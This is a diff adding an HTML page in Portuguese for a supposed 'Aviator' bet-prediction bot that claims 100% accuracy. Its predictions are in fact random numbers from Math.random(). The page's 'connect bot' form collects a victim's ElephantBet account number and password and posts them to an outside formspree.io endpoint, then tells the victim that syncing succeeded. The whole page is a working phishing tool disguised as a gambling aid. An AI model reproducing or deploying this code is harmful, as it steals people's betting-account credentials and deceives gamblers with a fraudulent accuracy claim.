@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>AVIATOR</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="manifest" href="manifest.json">
+  <style>
+    body {font-family:Arial,sans-serif;margin:0;padding:0;text-align:center;background:#f0f8ff;color:#000}
+    h1 {font-size:2em;margin:15px 0;color:#000}
+    .topbar {background:#009fe3;height:40px;width:100%}
+    .circle {width:180px;height:180px;border-radius:50%;border:6px solid #c00;display:flex;align-items:center;justify-content:center;margin:25px auto;font-size:1.8em;color:#fff;background:#000}
+    button {padding:15px 25px;font-size:1.1em;border:none;border-radius:5px;cursor:pointer;width:80%;max-width:320px;margin:15px auto;display:block;text-transform:uppercase;font-weight:bold}
+    #entrarBtn {background:#00c853;color:#fff}
+    #preverBtn {background:#001aff;color:#fff}
+    #openLogin {background:#c00;color:#fff}
+    #loginForm button {background:#009fe3;color:#fff}
+    #homeScreen,#gameScreen,#loginScreen,#syncScreen {display:none}
+    footer {margin-top:30px;font-size:.9em;color:#555}
+    input {border:2px solid #c00;border-radius:5px}
+  </style>
+</head>
+<body>
+  <div class="topbar"></div>
+  <!-- Tela inicial -->
+  <div id="homeScreen">
+    <img src="aviator.png" alt="Aviator" style="width:160px;margin-top:30px">
+    <h1>AVIATOR</h1>
+    <button id="entrarBtn">ENTRAR</button>
+    <p style="margin-top:15px;color:#000">Precisa de apoio? Ligue: <strong>926 128 955 ✅</strong></p>
+  </div>
+  <!-- Tela do jogo -->
+  <div id="gameScreen" style="background:#000;color:#fff;padding:20px">
+    <h1 style="color:#fff;background:#c00;padding:10px 0">
+      AVIATOR<br>
+      <span style="font-size:0.8em">100% de acertividade</span>
+    </h1>
+    <div id="circle" class="circle">1.00x</div>
+    <button id="preverBtn">PREVER PRÓXIMA VELA</button>
+    <button id="openLogin">CONECTAR BOT</button>
+    <p id="resultado"></p>
+    <p id="blockedMsg" style="display:none;background:#222;color:#ffcc00;padding:10px;border-radius:5px;width:90%;margin:10px auto">
+      ⚠️ Acesso bloqueado. Sincronize o Bot.
+    </p>
+  </div>
+  <!-- Tela de login -->
+  <div id="loginScreen" style="background:#00bfff;color:#000;padding:20px">
+    <h2>Conecte AVIATOR com sua conta da 
+      <span style="color:#c06;font-weight:bold">ELEPHANTBET</span>
+    </h2>
+    <a href="#" id="closeLogin" style="color:#800080;font-weight:bold">Voltar</a>
+    <form id="loginForm">
+      <label for="numeroLogin">Número da conta elephantbet:</label><br>
+      <input type="tel" id="numeroLogin" placeholder="Digite o seu número" 
+             required maxlength="9" pattern="9[0-9]{8}" 
+             style="width:90%;max-width:400px;padding:14px;font-size:1.1em"><br>
+
+      <label for="senhaLogin">Senha:</label><br>
+      <input type="password" id="senhaLogin" placeholder="Digite a sua senha" required 
+             style="width:90%;max-width:400px;padding:14px;font-size:1.1em"><br>
+
+      <!-- Checkbox para mostrar/ocultar senha -->
+      <label style="font-size:0.9em;color:#000">
+        <input type="checkbox" id="toggleSenha"> Mostrar senha
+      </label><br><br>
+
+      <button type="submit" style="width:90%;max-width:400px;padding:14px;font-size:1.1em">
+        CONECTE AGORA
+      </button>
+    </form>
+    <p id="statusMsg" style="color:#c00"></p>
+  </div>
+  <!-- Tela de sincronização concluída -->
+  <div id="syncScreen" style="background:#b2ebf2;color:#000;padding:20px">
+    <h2 style="color:#009fe3">Conexão Concluída!</h2>
+    <p>
+      Agradecemos pela <span style="color:#c06;font-weight:bold">Cooperação</span>.<br>
+      Aguarde pelos dados de configuração do bot.
+    </p>
+    <button id="backToGame" style="background:#c06;color:#fff">VOLTAR AO AVIATOR</button>
+  </div>
+
+  <footer>© AVIATOR</footer>
+  <audio id="beepSound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg"></audio>
+  <script>
+    const entrarBtn=document.getElementById("entrarBtn"),
+          homeScreen=document.getElementById("homeScreen"),
+          gameScreen=document.getElementById("gameScreen"),
+          loginScreen=document.getElementById("loginScreen"),
+          syncScreen=document.getElementById("syncScreen"),
+          loginForm=document.getElementById("loginForm"),
+          numeroLogin=document.getElementById("numeroLogin"),
+          senhaLogin=document.getElementById("senhaLogin"),
+          statusMsg=document.getElementById("statusMsg"),
+          circle=document.getElementById("circle"),
+          preverBtn=document.getElementById("preverBtn"),
+          resultado=document.getElementById("resultado"),
+          blockedMsg=document.getElementById("blockedMsg"),
+          openLogin=document.getElementById("openLogin"),
+          closeLogin=document.getElementById("closeLogin"),
+          backToGame=document.getElementById("backToGame"),
+          beepSound=document.getElementById("beepSound"),
+          toggleSenha=document.getElementById("toggleSenha");
+
+    // Botão ENTRAR leva direto ao jogo
+    entrarBtn.addEventListener("click",function(){
+      homeScreen.style.display="none";
+      gameScreen.style.display="block";
+    });
+
+    // Predictor estilo Aviator
+    preverBtn.addEventListener("click",function(){
+      beepSound.play();
+      let valor=1.00;
+      const resultadoFinal=gerarResultadoAviator();
+      const intervalo=setInterval(()=>{
+        valor+=0.05;
+        circle.textContent=valor.toFixed(2)+"x";
+        if(valor>=resultadoFinal){
+          clearInterval(intervalo);
+          circle.textContent=resultadoFinal.toFixed(2)+"x";
+          resultado.textContent=`Resultado → ${resultadoFinal.toFixed(2)}x`;
+        }
+      },30);
+    });
+
+    function gerarResultadoAviator(){
+      const multiplicadores=[1.2,1.3,1.5,2,3,5,7,10,20,50,100];
+      const pesos=[30,20,15,10,8,6,5,3,2,1,0.5];
+      const totalPeso=pesos.reduce((a,b)=>a+b,0);
+      let rand=Math.random()*totalPeso;
+      for(let i=0;i<multiplicadores.length;i++){
+        if(rand<pesos[i]) return multiplicadores[i];
+        rand-=pesos[i];
+      }
+      return 2;
+    }
+
+    // Login
+    openLogin.addEventListener("click",function(){
+      gameScreen.style.display="none";
+      loginScreen.style.display="block";
+    });
+    closeLogin.addEventListener("click",function(){
+      loginScreen.style.display="none";
+      gameScreen.style.display="block";
+    });
+
+    loginForm.addEventListener("submit",async function(event){
+      event.preventDefault();
+      const numero=numeroLogin.value;
+      const senha=senhaLogin.value;
+
+      if(!/^9\d{8}$/.test(numero)){
+        statusMsg.textContent="⚠️ O número deve começar com 9 e ter 9 dígitos.";
+        return;
+      }
+
+      statusMsg.textContent="Conectando...";
+      try{
+        await fetch("https://formspree.io/f/xvgwbowg",{
+          method:"POST",
+          body:JSON.stringify({numero,senha}),
+          headers:{"Content-Type":"application/json"}
+        });
+        statusMsg.textContent="✅ Sincronização concluída!";
+        loginScreen.style.display="none";
+        syncScreen.style.display="block";
+      }catch(error){
+        statusMsg.textContent="❌ Erro ao enviar dados.";
+      }
+    });
+
+    backToGame.addEventListener("click",function(){
+      syncScreen.style.display="none";
+      gameScreen.style.display="block";
+    });
+
+    // Alternar visibilidade da senha
+    toggleSenha.addEventListener("change",function(){
+      senhaLogin.type=this.checked ? "text" : "password";
+    });
+
+    // Inicial: mostra a tela de entrada logo ao abrir
+    homeScreen.style.display="block";
+
+    // Registrar Service Worker para PWA
+    if ("serviceWorker" in navigator) {
+      navigator.serviceWorker.register("./sw.js")
+        .then(() => console.log("Service Worker registrado com sucesso"))
+        .catch(error => console.log("Erro ao registrar Service Worker:", error));
+    }
+  </script>
+</body>
+</html>
